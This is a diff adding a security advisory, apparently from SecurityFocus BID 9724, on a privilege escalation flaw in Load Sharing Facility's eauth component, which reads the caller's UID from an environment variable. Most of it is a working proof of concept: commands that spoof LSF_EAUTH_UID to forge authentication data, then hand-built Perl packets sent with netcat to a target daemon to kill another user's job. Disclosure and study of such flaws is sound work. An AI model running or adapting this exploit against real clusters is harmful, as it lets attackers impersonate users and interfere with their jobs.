@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/9724/info
+
+Load Sharing Facility eauth component has been reported prone to privilege escalation vulnerability. The eauth component is responsible for controlling authentication procedures within Load Sharing Facility. An issue has been reported where an attacker may send commands to Load Sharing Facility as any user. The issue presents itself because eauth uses an environment variable to determine the UID of the user invoking the binary.
+
+$cat /etc/passwd|grep cadence
+cadence:x:500:500:Tomasz Grabowski:/home/cadence:/bin/bash
+$ export LSF_EAUTH_UID=500
+$ eauth -c hostname
+,',0/%+-$%$&&,/)
+
+Now, she needs to send packets. She can do it, for the sake of simplicity,
+using Perl and NetCat software:
+
+(
+# first packet
+perl -e 'print "\x04\x00\x00\x00\x0d\x00\x00\x00\x00\x00\x00\x00";
+print "\x00\x00\x00\x00";
+'
+sleep 1;
+
+#let's call it a header, packet length
+perl -e 'print "\x00\x04\x00\x00\x0d\x00\x00\x00\x00\x00\x00\x40";
+#below we provide UID, GID and length of user name
+print "\x00\x00\x00\x00\x00\x00\x03\xee\x00\x00\x03\xee\x00\x00\x00\x07";
+#below is the user name, end indicator, and probably auth data field length
+print "\x63\x61\x64\x65\x6e\x63\x65\x00\x00\x00\x00\x03\x00\x00\x00\x10";
+#again authentication length and auth data itself
+print "\x00\x00\x00\x10\x2a\x30\x26\x24\x21\x25\x2e\x23\x2c\x23\x27\x2d";
+#rest of auth data, end indicator, question code (x09 - bkill) and process number
+print "\x2f\x28\x2b\x25\x00\x00\x00\x02\x00\x00\x00\x09\x00\x00\x00\x77";
+print "\x00\x00\x00\x00";
+'
+#send it to the target daemon
+) | nc 192.168.10.106 6881
